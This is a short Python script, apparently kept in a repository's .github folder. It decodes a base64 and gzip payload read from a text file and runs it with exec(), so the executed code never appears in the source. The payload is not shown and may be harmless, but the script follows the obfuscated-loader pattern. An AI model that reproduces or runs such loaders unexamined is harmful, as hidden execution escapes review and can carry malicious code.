#!/usr/bin/env python3
from pathlib import Path
import base64
import gzip

payload = Path('.github/redesign_code_payload.txt').read_text(encoding='ascii').strip()
source = gzip.decompress(base64.b64decode(payload)).decode('utf-8')
exec(compile(source, '.github/redesign_apply_compiled.py', 'exec'), {'__name__': '__main__'})
